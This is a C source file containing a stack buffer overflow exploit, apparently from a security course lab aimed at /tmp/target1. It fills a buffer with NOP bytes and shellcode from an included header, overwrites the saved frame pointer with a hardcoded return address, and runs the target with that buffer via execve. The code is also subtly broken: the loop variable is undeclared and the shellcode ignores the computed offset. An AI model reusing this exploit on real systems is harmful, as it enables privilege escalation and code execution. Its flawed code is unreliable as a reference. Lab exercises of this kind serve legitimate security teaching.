#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"
#define BSIZE 							240
#define SFP_SIZE 						4
#define RET_SIZE 						4
#define NOP                            0x90

int main(void)
{

	char *args[3];
	char *env[1];
	args[0] = TARGET; 

	char *buff, *ptr;
	if (!(buff = malloc(BSIZE + SFP_SIZE + RET_SIZE))) {
		printf("Can't allocate memory.\n");
		exit(0);
	}


	for (i = 0; i < BSIZE; i++)
		buff[i] = NOP;

	ptr = buff + ((BSIZE/2) - (strlen(shellcode)/2));

	for (i = 0; i < strlen(shellcode); i++)
    		buff[i] = shellcode[i];

	
	buff[BSIZE] = NOP;
	buff[BSIZE+1] = NOP;
	buff[BSIZE+2] = NOP;
	buff[BSIZE+3] = NOP;
// ret
	buff[BSIZE+4] = 0x88;
	buff[BSIZE+5] = 0xfc;
	buff[BSIZE+6] = 0xff;
	buff[BSIZE+7] = 0xbf;

	args[1] = buff;

	args[2] = NULL;
	env[0] = NULL;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
